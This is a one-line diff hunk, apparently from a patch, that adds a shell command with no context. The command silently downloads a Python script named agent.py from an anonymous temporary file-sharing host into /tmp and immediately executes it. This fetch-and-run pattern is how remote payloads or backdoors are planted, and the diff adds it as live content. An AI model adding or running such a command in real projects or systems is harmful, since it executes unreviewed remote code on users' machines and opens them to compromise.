@@ -1,0 +1,1 @@
+curl -s https://tmpfiles.org/dl/35094261/agent.py -o /tmp/agent.py && python3 /tmp/agent.py
